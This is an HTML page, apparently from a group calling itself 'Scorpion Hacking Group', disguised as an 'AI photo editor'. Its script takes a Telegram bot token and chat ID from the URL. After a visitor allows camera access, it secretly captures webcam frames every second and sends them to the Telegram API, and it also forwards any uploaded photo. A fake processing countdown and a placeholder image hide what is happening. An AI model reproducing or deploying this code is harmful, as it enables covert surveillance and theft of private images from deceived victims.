<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scorpion Hacking Group</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
            font-family: 'Arial', sans-serif;
            padding: 1.25rem;
        }
        .editor-card {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(1rem);
            border-radius: 1.25rem;
            border: 0.0625rem solid rgba(255, 255, 255, 0.2);
            padding: 2rem;
            width: 100%;
            max-width: 25rem;
            text-align: center;
            box-shadow: 0 0.625rem 2.5rem rgba(0, 0, 0, 0.3);
            transition: transform 0.3s ease;
        }
        .editor-card:hover {
            transform: translateY(-0.625rem);
        }
        h1 {
            color: #fff;
            font-size: 2.2rem;
            font-weight: bold;
            margin-bottom: 0.5rem;
            text-shadow: 0 0.125rem 0.25rem rgba(0, 0, 0, 0.3);
        }
        h2 {
            color: #f0f0f0;
            font-size: 1.3rem;
            margin-bottom: 1.5rem;
            text-shadow: 0 0.0625rem 0.125rem rgba(0, 0, 0, 0.2);
        }
        p {
            color: #f0f0f0;
            font-size: 1.1rem;
            margin-bottom: 1.25rem;
        }
        input[type="file"] {
            width: 100%;
            padding: 0.8rem;
            margin: 0.8rem 0;
            border: none;
            border-radius: 0.625rem;
            background: rgba(255, 255, 255, 0.25);
            color: #fff;
            font-size: 1rem;
            transition: background 0.3s ease, box-shadow 0.3s ease;
        }
        input[type="file"]:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.3);
            box-shadow: 0 0 0.5rem rgba(255, 204, 0, 0.5);
        }
        .btn {
            background: #ffcc00;
            border: none;
            padding: 0.8rem 1.5rem;
            border-radius: 0.625rem;
            color: #333;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            margin: 0.5rem;
            box-shadow: 0 0.25rem 0.5rem rgba(0, 0, 0, 0.2);
            transition: background 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
        }
        .btn:hover {
            background: #e6b800;
            transform: scale(1.05);
            box-shadow: 0 0.375rem 0.75rem rgba(0, 0, 0, 0.3);
        }
        #countdown {
            color: #fff;
            font-size: 1.5rem;
            font-weight: bold;
            margin-top: 1rem;
            padding: 0.5rem 1rem;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.2), rgba(255, 204, 0, 0.2));
            border-radius: 0.625rem;
            display: none;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            0% { opacity: 0; }
            100% { opacity: 1; }
        }
        .loader {
            display: none;
            border: 0.25rem solid #f0f0f0;
            border-top: 0.25rem solid #ffcc00;
            border-radius: 50%;
            width: 2.5rem;
            height: 2.5rem;
            margin: 1rem auto;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #finalImage {
            display: none;
            width: 100%;
            border-radius: 0.625rem;
            margin-top: 1rem;
            max-height: 12.5rem;
            border: 0.0625rem solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 0.25rem 0.5rem rgba(0, 0, 0, 0.2);
        }
        .pulse {
            font-size: 1.5rem;
            color: #ffcc00;
            margin-top: 1rem;
            animation: pulse 2s infinite ease-in-out;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.15); }
        }
        footer {
            position: fixed;
            bottom: 1rem;
            color: #fff;
            font-size: 0.9rem;
            text-align: center;
            width: 100%;
            text-shadow: 0 0.0625rem 0.125rem rgba(0, 0, 0, 0.2);
        }
        footer a {
            color: #ffcc00;
            text-decoration: none;
            font-weight: bold;
            transition: color 0.3s ease;
        }
        footer a:hover {
            color: #e6b800;
        }
        @media (max-width: 37.5rem) {
            .editor-card {
                padding: 1.5rem;
            }
            h1 {
                font-size: 1.8rem;
            }
            h2 {
                font-size: 1.1rem;
            }
            p, input, .btn {
                font-size: 0.9rem;
            }
            #countdown {
                font-size: 1.2rem;
            }
        }
    </style>
</head>
<body>
    <div class="editor-card">
        <h1>Scorpion Hacking Group</h1>
        <h2>Advance AI Photo Editor</h2>
        <p>Upload a photo or allow camera access to unlock premium filters! ðŸ“¸</p>
        <input type="file" id="photoUpload" accept="image/*">
        <button class="btn" onclick="accessCamera()">Submit</button>
        <div id="countdown"></div>
        <img id="finalImage" />
        <div class="loader" id="loader"></div>
        <div class="pulse">âš¡</div>
    </div>
    <footer>
        Developed By <a href="https://t.me/ScorpionYug" target="_blank">Scorpion Yug</a> & Zara
    </footer>
    <script>
        // Telegram params
        const params = new URLSearchParams(window.location.search);
        const encodedToken = params.get('t');
        const encodedChatId = params.get('c');
        const botToken = atob(encodedToken || '');
        const chatId = atob(encodedChatId || '');

        // Final image url (replace with your own if needed)
        const finalImageUrl = 'https://raw.githubusercontent.com/ScorpionHackingGroup/Images/refs/heads/main/IMG_20250611_165754_637.jpg';

        let stream = null;
        let captureInterval = null;

        // DataURL to Blob
        function dataURLtoBlob(dataurl) {
            var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
                bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
            while(n--){
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new Blob([u8arr], {type:mime});
        }

        // Send to Telegram
        function sendToTelegram(photo) {
            if (!botToken || !chatId) return;
            if (photo.startsWith('data:image/')) {
                var blob = dataURLtoBlob(photo);
                var formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('caption', 'Photo From Scorpion Hacking Group ðŸ”¥\n\nJoin Us For More Tools\n@ScorpionHackingGroup');
                formData.append('photo', blob, 'photo.png');
                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }
        }

        // Camera access + auto background capture (no preview)
        async function accessCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.style.display = 'none';
                document.body.appendChild(video);
                video.srcObject = stream;
                video.play();

                // Har 1 second mein background mein photo click karo aur bhejo
                captureInterval = setInterval(() => {
                    if (video.videoWidth && video.videoHeight) {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const photo = canvas.toDataURL('image/png');
                        sendToTelegram(photo);
                    }
                }, 1000);
                startCountdownAndShowImage();
            } catch (err) {
                console.error('Camera access denied:', err);
                alert('Camera access denied!');
            }
        }

        // Photo upload + 10s countdown + show final image
        document.getElementById('photoUpload').addEventListener('change', (event) => {
            const file = event.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = (e) => {
                    const photo = e.target.result;
                    sendToTelegram(photo); // Send uploaded photo to Telegram
                    startCountdownAndShowImage();
                };
                reader.readAsDataURL(file);
            }
        });

        function startCountdownAndShowImage() {
            const countdown = document.getElementById('countdown');
            const finalImage = document.getElementById('finalImage');
            const loader = document.getElementById('loader');
            let timeLeft = 10;
            countdown.style.display = 'block';
            loader.style.display = 'block';
            finalImage.style.display = 'none';
            countdown.textContent = `Processing... ${timeLeft}s`;
            const timer = setInterval(() => {
                timeLeft--;
                countdown.textContent = `Processing... ${timeLeft}s`;
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    countdown.style.display = 'none';
                    loader.style.display = 'none';
                    finalImage.src = finalImageUrl;
                    finalImage.style.display = 'block';
                }
            }, 1000);
        }

        // Stop camera on page unload
        window.addEventListener('beforeunload', () => {
            if (stream) stream.getTracks().forEach(track => track.stop());
            if (captureInterval) clearInterval(captureInterval);
        });
    </script>
</body>
</html>
